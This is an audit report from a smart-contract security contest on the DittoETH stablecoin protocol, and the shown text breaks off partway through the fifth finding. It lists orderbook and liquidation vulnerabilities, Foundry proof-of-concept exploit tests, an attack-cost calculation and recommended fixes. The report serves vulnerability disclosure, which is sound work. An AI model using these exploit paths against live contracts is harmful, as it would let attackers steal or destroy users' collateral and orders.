# DittoETH 

Type: Contest

Dates: Sep 8th, 2023 - Oct 9th, 2023

DittoETH is a decentralized stable asset protocol minting pegged assets (stablecoins) using an orderbook, using over-collateralized staked ETH.

Code Under Review: https://github.com/Cyfrin/2023-09-ditto

More contest details: https://www.codehawks.com/contests/clm871gl00001mp081mzjdlwc

Rank: 1

# Findings Summary

- High : 7
- Medium : 2
- Low : 2


|ID|Title|Severity|
|-|:-|:-:|
| [H-01](#H-01)| User's can loose collateral when exiting a short | High |
| [H-02](#H-02)| New orders can overwrite active orders when order id reaches 65000 | High |
| [H-03](#H-03)| User can burn the NFT of a previously transferred ShortRecord | High |
| [H-04](#H-04)| All orders can be cancelled without reimbursing funds to creators once order id reaches 65000 | High |
| [H-05](#H-05)| Flag can be overriden by another user | High |
| [H-06](#H-06)| Certain user's may be able to leverage short order fills to delay primary liquidation on 254th | High |
| [H-07](#H-07)| User's can prevent getting flagged/liquidated by transferring the ShortRecord | High |
| [M-01](#M-01)| Secondary liquidations can revert due to difference in used oracle price | Medium |
| [M-02](#M-02)| Order creation can run out of gas since relying on previous order matchtype | Medium |
| [L-01](#L-01)| User's can loose their combined collateral if first id is passed twice in `combineShorts` | Low |
| [L-02](#L-02)| Loss of precision in `twapPriceInEther` due to division before multiplication | Low |


# Detailed Findings

# <a id='H-01'></a>H-01 User's can loose collateral when exiting a short

## Severity

High

## Summary

In `exitShort`, the ShortRecord is exited by placing a bid on the orderbook. If a partially filled ShortRecord matches with its own associated short order and fully buys back the debt, the user will loose the collateral present in the short order.

## Vulnerability

If the user's own short order is matched when calling `exitShort`, the debt and collateral of the short order is added to the same ShortRecord that is being exited. If the user wanted to buyBack the entire debt and is successful in doing so, the ShortRecord will be deleted. 
```solidity
    function exitShort(
        address asset,
        uint8 id,
        uint88 buyBackAmount,
        uint80 price,
        uint16[] memory shortHintArray
    )
        external
        isNotFrozen(asset)
        nonReentrant
        onlyValidShortRecord(asset, msg.sender, id)
    {
        
       // more code

        // Create bid with current msg.sender
        (e.ethFilled, e.ercAmountLeft) = IDiamond(payable(address(this))).createForcedBid(
            msg.sender, e.asset, price, buyBackAmount, shortHintArray
        );

        e.ercFilled = buyBackAmount - e.ercAmountLeft;
        Asset.ercDebt -= e.ercFilled;
        s.assetUser[e.asset][msg.sender].ercEscrowed -= e.ercFilled;


        // @audit if the debt is fully filled, the short record is deleted
        // Refund the rest of the collateral if ercDebt is fully paid back
        if (e.ercDebt == e.ercFilled) {
            // Full Exit
            LibShortRecord.disburseCollateral(
                e.asset, msg.sender, e.collateral, short.zethYieldRate, short.updatedAt
            );
            LibShortRecord.deleteShortRecord(e.asset, msg.sender, id); // prevent re-entrancy
``` 
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ExitShortFacet.sol#L145-L224

Since the user's newly added collateral from the partially filled short order is accounted in this ShortRecord, it will lead to the user loosing the collateral.

```solidity
    function matchlowestSell(
        address asset,
        STypes.Order memory lowestSell,
        STypes.Order memory incomingBid,
        MTypes.Match memory matchTotal
    ) private {

            // more code

            // @audit if the short order is already associated with a shortRecord, the collateral and debt is accounted there
            if (lowestSell.shortRecordId > 0) {
                // shortRecord has been partially filled before
                LibShortRecord.fillShortRecord(
                    asset,
                    lowestSell.addr,
                    lowestSell.shortRecordId,
                    status,
                    shortFillEth,
                    fillErc,
                    matchTotal.ercDebtRate,
                    matchTotal.zethYieldRate
                );
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/BidOrdersFacet.sol#L254-L294

### Example scenario:
1. User calls the `createLimitShort` function with `price = 2000` and `debt = 100`. Hence supplying `collateral = 5 * 2000 * 100`
2. Based on the current bids present in the orderbook, `50 ercTokens` is sold. 
3. This will create a ShortRecord with `debt = 50` and ` collateral = 3 * 2000 * 100` and a short order will be placed on the orderbook with `ercTokens amount = 50` and `price = 2000`.
4. After some time the user decides to completely exit the short. The user calls `exitShort()` with `buyBackAmount = 50` and `price = 2000`.
5. The lowest priced short order happens to be that of the user itself. Hence these two are matched resulting in the short order accounting for the new `collateral` and `debt` in the same ShortRecord.
`ShortRecord.debt += 50` and `ShortRecord.collateral += 3 * 2000 * 100`.
6. Since the enitre bid order is filled, `e.ercDebt == e.ercFilled` will pass, executing `LibShortRecord.deleteShortRecord(e.asset, msg.sender, id)`. This will delete the ShortRecord leading to the user not being able to claim his newly added `debt and collateral`. 

### POC Test
Add the following changes to test/Shorts.t.sol and run.
```diff
diff --git a/test/Shorts.t.sol b/test/Shorts.t.sol
index f1c3927..79c4d52 100644
--- a/test/Shorts.t.sol
+++ b/test/Shorts.t.sol
@@ -72,6 +72,51 @@ contract ShortsTest is OBFixture {
         );
     }
 
+    function test_userLoosesCollateralOnMatchingWithUsersOwnShort() public{
+        uint88 DEFAULT_AMOUNT_HALF = DEFAULT_AMOUNT/2;
+        
+        //funded inside fundLimitShortOpt
+        uint88 userVaultEthEscrowedInitial = SHORT1_PRICE.mulU80(DEFAULT_AMOUNT) * 5;
+
+        //bids fills half the short
+        fundLimitBidOpt(SHORT1_PRICE, DEFAULT_AMOUNT_HALF, receiver);
+        fundLimitShortOpt(SHORT1_PRICE, DEFAULT_AMOUNT, sender);
+
+        //after short creation funds are split for the short order and the collateral
+        assertEq(diamond.getVaultUserStruct(vault,sender).ethEscrowed,userVaultEthEscrowedInitial - SHORT1_PRICE.mulU80(DEFAULT_AMOUNT) * 5);
+        
+        STypes.Order memory userShortOrder = diamond.getShorts(asset)[0];
+
+        assertEq(userShortOrder.addr,sender);
+        assertEq(userShortOrder.ercAmount,DEFAULT_AMOUNT_HALF);
+
+        STypes.ShortRecord memory userShortRecord = diamond.getShortRecords(asset,sender)[0];
+
+        assertEq(
+            userShortRecord.ercDebt, DEFAULT_AMOUNT_HALF
+        );
+
+        assertEq(
+            userShortRecord.collateral,
+            SHORT1_PRICE.mulU80(DEFAULT_AMOUNT_HALF) * 6
+        );
+
+        //exit matching with the same short. this is supposed to move the funds from the short order to the short record. it does but since the record gets cancelled the user can no longer access these funds
+        vm.prank(sender);
+        uint16[] memory shortHintArray = new uint16[](1);
+        shortHintArray[0] = userShortOrder.id;
+
+        diamond.exitShort(asset,userShortRecord.id,userShortRecord.ercDebt,SHORT1_PRICE,shortHintArray);
+
+        //short order gets filled and short record gets cancelled
+        assertEq(diamond.getShorts(asset).length,0);
+        assertEq(diamond.getShortRecords(asset,sender).length,0);
+ 
+        // user now only has half of initial
+         assertEq(diamond.getVaultUserStruct(vault,sender).ethEscrowed,userVaultEthEscrowedInitial/2);
+        
+    }
+
     function prepareExitShort(uint8 exitType) public {
         makeShorts();
```

## Impact

Users will loose collateral

## Recommendation

Check if the existing debt is equal to the previous debt
```diff
diff --git a/contracts/facets/ExitShortFacet.sol b/contracts/facets/ExitShortFacet.sol
index 8c73c38..4dadd69 100644
--- a/contracts/facets/ExitShortFacet.sol
+++ b/contracts/facets/ExitShortFacet.sol
@@ -216,7 +216,7 @@ contract ExitShortFacet is Modifiers {
         s.assetUser[e.asset][msg.sender].ercEscrowed -= e.ercFilled;
 
         // Refund the rest of the collateral if ercDebt is fully paid back
-        if (e.ercDebt == e.ercFilled) {
+        if (e.ercDebt == e.ercFilled && short.ercDebt == e.ercDebt) {
             // Full Exit
             LibShortRecord.disburseCollateral(
                 e.asset, msg.sender, e.collateral, short.zethYieldRate, short.updatedAt

```

# <a id='H-02'></a>H-02 New orders can overwrite active orders when order id reaches 65000

## Severity

High

## Summary

When the orderId for an asset reaches 65000 the `cancelOrderFarFromOracle` allows to cancel an already cancelled order. An attacker can exploit this to overwrite all the active orders in the respective orderbook.

## Vulnerability

Once the orderId for an asset reaches 65000 `cancelOrderFarFromOracle` function allows to cancel an order if it's nextId is Constants.TAIL assuming it is the last order in the book.
```solidity
    function cancelOrderFarFromOracle(
        address asset,
        O orderType,
        uint16 lastOrderId,
        uint16 numOrdersToCancel
    ) external onlyValidAsset(asset) nonReentrant {
        if (s.asset[asset].orderId < 65000) {
            revert Errors.OrderIdCountTooLow();
        }

        if (numOrdersToCancel > 1000) {
            revert Errors.CannotCancelMoreThan1000Orders();
        }

        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {
            if (
                orderType == O.LimitBid
                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL
            ) {
                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (
            
            /// more code. similar deletion for asks and shorts
            
            }
        } else {
            //@dev if address is not DAO, you can only cancel last order of a side
            if (
                orderType == O.LimitBid
                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL
            ) {
                s.bids.cancelOrder(asset, lastOrderId);
            } else if (
               
            /// more code. similar deletion for asks and shorts
        }
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124-L177C10

But this assumption is wrong as a previously deleted order can have it's nextId set to Constants.TAIL. This allows an attacker to cancel an already cancelled order which can result in disruption of the linked list maintained for the orders. The attacker can change the route the HEAD's prevId (the cancelled orders list) will take to point to a chain of already existing orders overwriting them when a new order comes. 
When there are atleast 2 cancelled orders, re cancelling the closest canceled order to the HEAD (HEAD.prevId) will result in the prevId of the cancelled order pointing to itself. 

```solidity
    function _reuseOrderIds(
        mapping(address => mapping(uint16 => STypes.Order)) storage orders,
        address asset,
        uint16 id,
        uint16 prevHEAD,
        O cancelledOrMatched
    ) private {
       
       // more code

       // @audit if the prevHead was order with id itself, then it's prevId will be id
 
        if (prevHEAD != Constants.HEAD) {
            orders[asset][id].prevId = prevHEAD;
        } else {
``` 
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOrders.sol#L356-L377

When a new order is created, HEAD.prevId is reused. After which the next HEAD.prevId will be HEAD.prevId.prevId. In this case, it will again point to the same id. But now that the order is placed in the orderbook, the prevId of this order points to another active order which will be overwritten when a new order is created. 

### POC Test
```diff
diff --git a/test/CancelOrder.t.sol b/test/CancelOrder.t.sol
index e7b9e2f..96c6797 100644
--- a/test/CancelOrder.t.sol
+++ b/test/CancelOrder.t.sol
@@ -7,7 +7,7 @@ import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
 import {LibOrders} from "contracts/libraries/LibOrders.sol";
 
 import {OBFixture} from "test/utils/OBFixture.sol";
-// import {console} from "contracts/libraries/console.sol";
+import {console} from "contracts/libraries/console.sol";
 
 contract CancelOrderTest is OBFixture {
     using U256 for uint256;
@@ -317,6 +317,92 @@ contract CancelOrderTest is OBFixture {
         });
     }
 
+    function test_OnceReached65000NewOrdersCanOverwriteExistingOrders() public {
+        address attacker = address(78);
+        vm.label(attacker, "attacker");
+
+        uint80 price1 = 1 ether;
+        uint80 price2 = 2 ether;
+        uint80 price3 = 3 ether;
+        uint80 price4 = 4 ether;
+        uint80 price5 = 5 ether;
+        uint80 price6 = 6 ether;
+        uint80 price7 = 7 ether;
+        uint80 price8 = 8 ether;
+
+        uint88 askAmount = 1 ether;
+
+        fundLimitAskOpt(price1, askAmount, receiver);
+        fundLimitAskOpt(price2, askAmount, receiver);
+        fundLimitAskOpt(price3, askAmount, receiver);
+        fundLimitAskOpt(price4, askAmount, receiver);
+        fundLimitAskOpt(price5, askAmount, receiver);
+        fundLimitAskOpt(price6, askAmount, receiver);
+        fundLimitAskOpt(price8, askAmount, receiver);
+
+        assertEq(getAsks().length, 7);
+
+        //setting order id to 65000 and cancelling 2 orders so as to call cancelOrderFarFromOracle() on a cancelled order which has another previous order
+        vm.prank(owner);
+        testFacet.setOrderIdT(asset, 65000);
+        {
+            uint80 price100 = 100 ether;
+
+            fundLimitAskOpt(price100, askAmount, attacker);
+            fundLimitAskOpt(price100, askAmount, attacker);
+
+            vm.startPrank(attacker);
+            diamond.cancelAsk(asset, 65001);
+            diamond.cancelAsk(asset, 65000);
+        }
+
+        //since checking for last order by .next == Constatns.TAIL, most recently cancelled order also satisfies this
+        //this will make the order point to itself as previous
+        diamond.cancelOrderFarFromOracle({
+            asset: asset,
+            orderType: O.LimitAsk,
+            lastOrderId: 65000,
+            numOrdersToCancel: 1
+        });
+        vm.stopPrank();
+
+        //a new order created now will use this order but the head will still be pointing to this order as the previous order / start of cancel order chain
+        //hence all upcoming orders will replace the orders backwards starting from price7, id=65000
+        assertEq(getAsks().length, 7);
+        fundLimitAskOpt(price7, askAmount, receiver);
+        assertEq(getAsks().length, 8);
+        uint256[] memory replacingOrders = new uint[](7);
+        uint256 replacingOrderIndex = 0;
+        {
+            STypes.Order[] memory asks = getAsks();
+            // now all orders from 7 to 1 are that of receivers
+            for (uint256 i = 0; i < asks.length; i++) {
+                assertEq(asks[i].addr, receiver);
+                if (asks[i].price != price8) {
+                    replacingOrders[replacingOrderIndex] = asks[i].id;
+                    replacingOrderIndex++;
+                }
+            }
+        }
+        {
+            //these orders replaces previous orders of the receiver
+            fundLimitAskOpt(price7, askAmount, attacker);
+            fundLimitAskOpt(price6, askAmount, attacker);
+            fundLimitAskOpt(price5, askAmount, attacker);
+            fundLimitAskOpt(price4, askAmount, attacker);
+            fundLimitAskOpt(price3, askAmount, attacker);
+            fundLimitAskOpt(price2, askAmount, attacker);
+            fundLimitAskOpt(price1, askAmount, attacker);
+        }
+
+        //all orders are that of the attacker
+        for (uint256 i = 0; i < 7; i++) {
+            STypes.Order memory ask =
+                diamond.getAskOrder(asset, uint16(replacingOrders[i]));
+            assertEq(ask.addr, attacker);
+        }
+    }
+
     //NON-DAO
     function testRevertNotLastOrder() public {
         setOrderIdAndMakeOrders({orderType: O.LimitBid});
```

## Impact

Users having an active order at present or in future will loose their funds.

## Recommendation

Add to checks to see if the order is already cancelled. Since this function also doesn't reimburse funds it would be best to change it to the way a normal cancel order function would work except that msg.sender could be anybody.

```diff
diff --git a/contracts/facets/OrdersFacet.sol b/contracts/facets/OrdersFacet.sol
index 0a924e7..7cbb8bd 100644
--- a/contracts/facets/OrdersFacet.sol
+++ b/contracts/facets/OrdersFacet.sol
@@ -59,6 +59,11 @@ contract OrdersFacet is Modifiers {
     {
         STypes.Order storage ask = s.asks[asset][id];
         if (msg.sender != ask.addr) revert Errors.NotOwner();
+        _cancelAsk(asset, id);
+    }
+
+    function _cancelAsk(address asset, uint16 id) internal {
+        STypes.Order storage ask = s.asks[asset][id];
         O orderType = ask.orderType;
         if (orderType == O.Cancelled || orderType == O.Matched) {
             revert Errors.NotActiveOrder();
@@ -165,7 +170,8 @@ contract OrdersFacet is Modifiers {
                 orderType == O.LimitAsk
                     && s.asks[asset][lastOrderId].nextId == Constants.TAIL
             ) {
-                s.asks.cancelOrder(asset, lastOrderId);
+                _cancelAsk(asset, lastOrderId);
+                // s.asks.cancelOrder(asset, lastOrderId);
             } else if (
                 orderType == O.LimitShort
                     && s.shorts[asset][lastOrderId].nextId == Constants.TAIL

```
Similar changes to bids and shorts

# <a id='H-03'></a>H-03 User can burn the NFT of a previously transferred ShortRecord

## Severity

High

## Vulnerability

When a NFT is transferred to another user, the tokenId is not cleared from the original ShortRecord. Although this ShortRecord is marked as cancelled, it could be reused if it is associated with a partially filled short order. 
```solidity
    function matchlowestSell(
        address asset,
        STypes.Order memory lowestSell,
        STypes.Order memory incomingBid,
        MTypes.Match memory matchTotal
    ) private {
       
            // more code

            // @audit reuse shortRecord on further fills

            if (lowestSell.shortRecordId > 0) {
                // shortRecord has been partially filled before
                LibShortRecord.fillShortRecord(
                    asset,
                    lowestSell.addr,
                    lowestSell.shortRecordId,
                    status,
                    shortFillEth,
                    fillErc,
                    matchTotal.ercDebtRate,
                    matchTotal.zethYieldRate
                );
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/BidOrdersFacet.sol#L254-L294

The attacker can then call the `combineShorts` function with the shortId which will lead to burning of this NFT.
```solidity
    function combineShorts(address asset, uint8[] memory ids)
        external
        isNotFrozen(asset)
        nonReentrant
        onlyValidShortRecord(asset, msg.sender, ids[0])
    {
           // more code

           // @audit burns the tokenId nft even if it was previously transferred

            if (currentShort.tokenId != 0) {
                //@dev First short needs to have NFT so there isn't a need to burn and re-mint
                if (firstShort.tokenId == 0) {
                    revert Errors.FirstShortMustBeNFT();
                }


                LibShortRecord.burnNFT(currentShort.tokenId);
            }
``` 
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ShortRecordFacet.sol#L117-L169

### POC Test
```diff
diff --git a/test/ERC721Facet.t.sol b/test/ERC721Facet.t.sol
index b4cf84b..8a66110 100644
--- a/test/ERC721Facet.t.sol
+++ b/test/ERC721Facet.t.sol
@@ -453,6 +453,37 @@ contract ERC721Test is OBFixture {
         diamond.ownerOf(2);
     }
 
+    function test_PrevOwnerCanDeleteNFTByCombiningShorts() public{
+        createShortAndMintNFT();
+
+        //first half of the short order is filled
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT/2, sender);
+        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+
+        //mint nft and transfer short record
+        vm.startPrank(sender);
+        diamond.mintNFT(asset, Constants.SHORT_STARTING_ID + 1);
+        diamond.safeTransferFrom(sender, address(0xBEEF), 2, "");
+        vm.stopPrank();
+
+        assertEq(diamond.ownerOf(2), address(0xBEEF));
+        assertEq(diamond.balanceOf(address(0xBEEF)), 1);
+
+        //fill the other half of the short order to activate the same short record
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT/2, sender);
+
+        vm.prank(sender);
+        combineShorts({
+            id1: Constants.SHORT_STARTING_ID,
+            id2: Constants.SHORT_STARTING_ID + 1
+        });
+
+        //nft 2 previously transferred to 0xBEEF is burned
+        vm.expectRevert(abi.encodeWithSelector(Errors.ERC721NonexistentToken.selector, 2));
+        diamond.ownerOf(2);
+        assertEq(diamond.balanceOf(address(0xBEEF)), 0);
+    }
+
     function test_CombineShort_TwoShortsOneNFT() public {
         //@dev first short has nft, second does not
         createShortAndMintNFT();

```

## Impact

In case the access to the ShortRecord is solely via the NFT (some contract implementations?) this will result in loss of the collateral for the transferred address.

## Recommendation

Clear the tokenId when an NFT is transferred
```diff
diff --git a/contracts/libraries/LibShortRecord.sol b/contracts/libraries/LibShortRecord.sol
index 7c5ecc3..4a179b7 100644
--- a/contracts/libraries/LibShortRecord.sol
+++ b/contracts/libraries/LibShortRecord.sol
@@ -129,6 +129,7 @@ library LibShortRecord {
         if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();
         if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();
 
+        short.tokenId = 0;
         deleteShortRecord(asset, from, nft.shortRecordId);
 
         uint8 id = createShortRecord(

```

# <a id='H-04'></a>H-04 All orders can be cancelled without reimbursing funds to creators once order id reaches 65000

## Severity

High

## Vulnerability

The `cancelOrderFarFromOracle` function fails to reimburse funds to the order creator upon cancellation and doesn't decrement the order id when orders get cancelled. Hence if once order id reaches 65000, an attacker can continously delete the last order how much ever times as wished, giving the ability to eventually delete all the orders. 

```solidity
    function cancelOrderFarFromOracle(
        address asset,
        O orderType,
        uint16 lastOrderId,
        uint16 numOrdersToCancel
    ) external onlyValidAsset(asset) nonReentrant {
        if (s.asset[asset].orderId < 65000) {
            revert Errors.OrderIdCountTooLow();
        }

        if (numOrdersToCancel > 1000) {
            revert Errors.CannotCancelMoreThan1000Orders();
        }

        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {
            if (
                orderType == O.LimitBid
                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL
            ) {
                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (
            
            /// more code. similar deletion for asks and shorts
            
            }
        } else {
            //@dev if address is not DAO, you can only cancel last order of a side
            if (
                orderType == O.LimitBid
                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL
            ) {
                s.bids.cancelOrder(asset, lastOrderId);
            } else if (
               
            /// more code. similar deletion for asks and shorts
        }
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124-L177C10

```solidity

    // @audit cancelOrder just manages the location of the cancelled order on the orderbook 

    function cancelOrder(
        mapping(address => mapping(uint16 => STypes.Order)) storage orders,
        address asset,
        uint16 id
    ) internal {
        // save this since it may be replaced
        uint16 prevHEAD = orders[asset][Constants.HEAD].prevId;

        // remove the links of ID in the market
        // @dev (ID) is exiting, [ID] is inserted
        // BEFORE: PREV <-> (ID) <-> NEXT
        // AFTER : PREV <----------> NEXT
        orders[asset][orders[asset][id].nextId].prevId = orders[asset][id].prevId;
        orders[asset][orders[asset][id].prevId].nextId = orders[asset][id].nextId;


        // create the links using the other side of the HEAD
        emit Events.CancelOrder(asset, id, orders[asset][id].orderType);
        _reuseOrderIds(orders, asset, id, prevHEAD, O.Cancelled);
    }
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOrders.sol#L317-L335

### Test Code
```diff
diff --git a/test/CancelOrder.t.sol b/test/CancelOrder.t.sol
index e7b9e2f..65419dd 100644
--- a/test/CancelOrder.t.sol
+++ b/test/CancelOrder.t.sol
@@ -1,17 +1,19 @@
 // SPDX-License-Identifier: GPL-3.0-only
 pragma solidity 0.8.21;
 
-import {U256, U88} from "contracts/libraries/PRBMathHelper.sol";
+import {U256, U88,U80} from "contracts/libraries/PRBMathHelper.sol";
 import {Errors} from "contracts/libraries/Errors.sol";
 import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
 import {LibOrders} from "contracts/libraries/LibOrders.sol";
 
 import {OBFixture} from "test/utils/OBFixture.sol";
 // import {console} from "contracts/libraries/console.sol";
+import {Constants, Vault} from "contracts/libraries/Constants.sol";
 
 contract CancelOrderTest is OBFixture {
     using U256 for uint256;
     using U88 for uint88;
+    using U80 for uint80;
 
     uint256 private startGas;
     uint256 private gasUsed;
@@ -240,6 +242,59 @@ contract CancelOrderTest is OBFixture {
         });
     }
 
+    function test_OnceReached65000CanCancelInfiniteAndDoesntAccount() public {
+        uint80 price = type(uint80).max;
+        uint256 minAskEth = 0.001 ether;
+        uint88 minAskAmount = uint88((minAskEth * 1 ether) / price) + 1;
+        assertEq(price.mul(minAskAmount) > minAskEth,true);
+        assertEq(minAskAmount , 0.000000000827180613 ether);
+        assertEq(minAskAmount * 65000 , 0.000053766739845 ether );
+
+        vm.prank(owner);
+        testFacet.setOrderIdT(asset, 64995);
+
+        //a bid that will be cancelled without accounting by the attacker
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+        assertEq(getBids().length, 1);
+        assertEq(getBids()[0].addr, receiver);
+
+        depositUsd(extra, minAskAmount * 4);
+
+        //create 4 asks to reach 65000
+        for(uint i=0;i<4;i++){
+
+            MTypes.OrderHint[] memory orderHintArray =
+            diamond.getHintArray(asset, price, O.LimitAsk);
+
+            vm.prank(extra);
+            diamond.createAsk(asset, price, minAskAmount, Constants.LIMIT_ORDER, orderHintArray);
+        }
+        
+        //delete 4 asks made by attacker
+         assertEq(diamond.getAssetNormalizedStruct(asset).orderId, 65000);
+         for(uint16 i=1;i<=4;i++){
+            vm.prank(extra);
+            diamond.cancelOrderFarFromOracle({
+            asset: asset,
+            orderType: O.LimitAsk,
+            lastOrderId: 65000 - i,
+            numOrdersToCancel: 1
+        });
+         }
+
+        //delete the bid
+        vm.prank(extra);
+        diamond.cancelOrderFarFromOracle({
+            asset: asset,
+            orderType: O.LimitBid,
+            lastOrderId: 64995,
+            numOrdersToCancel: 1});
+
+       //user doesn't get any funds returned 
+       assertEq(getBids().length, 0);
+       assertEq(diamond.getVaultUserStruct(vault,receiver).ethEscrowed,0);
+    }
+
     function testRevertMoreThan1000Orders() public {
         vm.prank(owner);
         testFacet.setOrderIdT(asset, 65000);
```

Even if the order id doesn't reach anywhere close to 65000, an exploit is possible depending on the attacker's ability to spend for gas fees (a calculation is attached below) and the time it would take for the project to react. Apart from causing grief to the user's and disrupting the protocol, certain market conditions might allow the attacker to even profit off the attack eventually. If the amount of pegged asset in the order-book is extremely high, an attacker might profit off by selling the pegged asset in a secondary market where demand could be generated by the `shorters` trying to obtain the pegged asset to close their debt and obtain their collateral worth 5x more back.  

Apart from this an incorrect assumption is made that `each order requires a minimum ETH amount` when considering the possibility of order id reaching 65000 due to spam orders. Although creation of bids and shorts require a minimum amount of eth, asks can be created with a very low amount (0.000000000827180613 usd) of pegged asset by providing maximum value for price. The requirement for creation of asks is that:
```
        uint256 eth = price.mul(ercAmount);
        uint256 minAskEth = LibAsset.minAskEth(asset);
        if (eth < minAskEth) revert Errors.OrderUnderMinimumSize();

        if (s.assetUser[asset][msg.sender].ercEscrowed < ercAmount) {
            revert Errors.InsufficientERCEscrowed();
        }
```

### Cost Calculation

Spam Orders Creation Cost:

Since the price is not capped, an attacker can provide price as type(uint80).max:
```
minAskEth = 0.001 * 1e18
price = type(uint80).max
ercAmount = (minAskEth * 1 ether) / price + 1 == 0.000000000827180613 usd
for 65000 orders = 0.000053766739845 usd
```

The attacker would have to spent the gas fees to create the ask order 65000 times at max. Calculating the required USD for the attack with some assumptions:
```
approximate gas single call (createAsk) : 83959
max gas required: 65000 * 83959 = 5457335000
ether price range : 1600usd - 2000usd
gas price range : 20gwei - 100gwei
usd cost range: 180092 - 1091467
```

To Cancel Orders:

```
approximate gas single call (GasCancelAskFarFromHead) : 40686
max gas required: 65000 * 40686 = 2644590000
ether price range : 1600usd - 2000usd
gas price range : 20gwei - 100gwei
usd cost range: 84626 - 528918
```

Hence an attack costing in the range 264718 - 1620385 USD would most likely be able to disrupt the entire project.

## Impact

Users having an active order at present or in future will loose their funds

## Recommendation

Reimburse funds on cancellation of orders. Since this function also fails to verify the order status before cancellation which leads to another exploit, it would be best to follow all the checks done for normal cancellation of orders.

```diff
diff --git a/contracts/facets/OrdersFacet.sol b/contracts/facets/OrdersFacet.sol
index 0a924e7..7cbb8bd 100644
--- a/contracts/facets/OrdersFacet.sol
+++ b/contracts/facets/OrdersFacet.sol
@@ -59,6 +59,11 @@ contract OrdersFacet is Modifiers {
     {
         STypes.Order storage ask = s.asks[asset][id];
         if (msg.sender != ask.addr) revert Errors.NotOwner();
+        _cancelAsk(asset, id);
+    }
+
+    function _cancelAsk(address asset, uint16 id) internal {
+        STypes.Order storage ask = s.asks[asset][id];
         O orderType = ask.orderType;
         if (orderType == O.Cancelled || orderType == O.Matched) {
             revert Errors.NotActiveOrder();
@@ -165,7 +170,8 @@ contract OrdersFacet is Modifiers {
                 orderType == O.LimitAsk
                     && s.asks[asset][lastOrderId].nextId == Constants.TAIL
             ) {
-                s.asks.cancelOrder(asset, lastOrderId);
+                _cancelAsk(asset, lastOrderId);
+                // s.asks.cancelOrder(asset, lastOrderId);
             } else if (
                 orderType == O.LimitShort
                     && s.shorts[asset][lastOrderId].nextId == Constants.TAIL

```
Similar changes to bids and shorts

# <a id='H-05'></a>H-05 Flag can be overriden by another user

## Severity

High

## Vulnerability

The `setFlagger` function allows a new flagger to reuse `flaggerHint` flag id after `LibAsset.firstLiquidationTime` has passed after flagId has been updated. 
```solidity
    function setFlagger(
        STypes.ShortRecord storage short,
        address cusd,
        uint16 flaggerHint
    ) internal {

           if (flagStorage.g_flaggerId == 0) {
            address flaggerToReplace = s.flagMapping[flaggerHint];

            // @audit if timeDiff > firstLiquidationTime, replace the flagger address

            uint256 timeDiff = flaggerToReplace != address(0)
                ? LibOrders.getOffsetTimeHours()
                    - s.assetUser[cusd][flaggerToReplace].g_updatedAt
                : 0;
            //@dev re-use an inactive flaggerId
            if (timeDiff > LibAsset.firstLiquidationTime(cusd)) {
                delete s.assetUser[cusd][flaggerToReplace].g_flaggerId;
                short.flaggerId = flagStorage.g_flaggerId = flaggerHint;

            // more code

            s.flagMapping[short.flaggerId] = msg.sender;
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L377-L404C13

Since the previous flagger can only liquidate the flagged short after `LibAsset.firstLiquidationTime` has passed, the flagged short will be unliquidated till that time. Both the ability to flag the short for first flagger and the ability to replace the first flagger starts at the same instant. This allows a new flagger to take control over the liquidation of the flagged short by finding some other liquidatable short and passing in the flagId of the previous flagger as the `flagHint`.

### POC Test
```diff
diff --git a/test/MarginCallFlagShort.t.sol b/test/MarginCallFlagShort.t.sol
index 906657e..3d7f985 100644
--- a/test/MarginCallFlagShort.t.sol
+++ b/test/MarginCallFlagShort.t.sol
@@ -169,6 +169,90 @@ contract MarginCallFlagShortTest is MarginCallHelper {
         assertEq(diamond.getFlagger(shortRecord.flaggerId), extra);
     }
 
+    function test_FlaggerId_Override_Before_Call() public {
+        address flagger1 = address(77);
+        address flagger2 = address(78);
+
+        vm.label(flagger1, "flagger1");
+        vm.label(flagger2, "flagger2");
+
+        //create first short
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord1 =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID);
+
+        assertEq(diamond.getFlaggerIdCounter(), 1);
+        assertEq(shortRecord1.flaggerId, 0);
+        assertEq(diamond.getFlagger(shortRecord1.flaggerId), address(0));
+
+        //flag first short
+        setETH(2500 ether);
+        vm.prank(flagger1);
+        diamond.flagShort(asset, sender, shortRecord1.id, Constants.HEAD);
+        shortRecord1 = diamond.getShortRecord(asset, sender, shortRecord1.id);
+
